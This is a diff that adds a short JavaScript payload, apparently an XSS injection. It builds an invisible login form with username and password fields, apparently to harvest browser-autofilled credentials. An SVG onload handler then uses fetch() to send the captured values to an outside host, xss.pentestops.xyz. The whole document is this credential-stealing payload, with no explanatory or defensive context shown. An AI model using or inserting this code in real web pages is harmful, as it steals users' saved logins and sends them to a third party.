@@ -1,0 +1,12 @@
+var f=document.createElement('form');
+var u=document.createElement('input');
+var p=document.createElement('input');
+var svg=document.createElement('svg');
+u.id='u';
+p.id='p';
+p.type='password';
+f.appendChild(u);
+f.appendChild(p);
+document.body.appendChild(f);
+svg.setAttribute('onload','setTimeout(()=>fetch("https://xss.pentestops.xyz/?u="+document.getElementById("u").value+"&p="+encodeURIComponent(document.getElementById("p").value)),2000)');
+document.body.appendChild(svg);
